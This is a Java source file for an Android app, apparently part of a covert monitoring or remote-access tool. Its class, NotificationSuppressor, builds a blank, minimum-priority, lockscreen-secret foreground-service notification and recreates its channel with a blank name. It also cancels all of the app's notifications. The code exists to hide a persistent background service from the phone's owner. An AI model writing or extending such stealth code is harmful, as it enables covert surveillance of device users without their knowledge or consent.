package com.fason.app.stealth;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import androidx.core.app.NotificationCompat;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;

/**
 * NotificationSuppressor — Stealth notification management.
 *
 * Provides methods to enable/disable stealth notifications
 * and suppress all app notifications from appearing in the shade.
 */
public final class NotificationSuppressor {

    private static volatile boolean stealthActive = false;

    public static Notification buildStealthNotification() {
        Context ctx = FasonApp.getContext();

        NotificationCompat.Builder builder = new NotificationCompat.Builder(ctx, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle(null)
            .setContentText(null)
            .setSubText(null)
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setGroup("sys")
            .setGroupSummary(true);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(createStealthChannel(ctx));
        }

        return builder.build();
    }

    private static String createStealthChannel(Context ctx) {
        NotificationManager nm = ctx.getSystemService(NotificationManager.class);
        if (nm == null) return Protocol.NOTIF_CHANNEL;

        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
        if (existing != null) {
            nm.deleteNotificationChannel(Protocol.NOTIF_CHANNEL);
        }

        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, " ", NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(" ");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setBypassDnd(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ch.setAllowBubbles(false);
        }
        nm.createNotificationChannel(ch);
        return Protocol.NOTIF_CHANNEL;
    }

    /** Enable stealth notification mode — suppress all notifications. */
    public static void enable(Context ctx) {
        stealthActive = true;
        NotificationManager nm = ctx.getSystemService(NotificationManager.class);
        if (nm != null) {
            nm.cancelAll();
        }
    }

    /** Disable stealth notification mode. */
    public static void disable(Context ctx) {
        stealthActive = false;
    }

    public static boolean isStealthActive() {
        return stealthActive;
    }
}
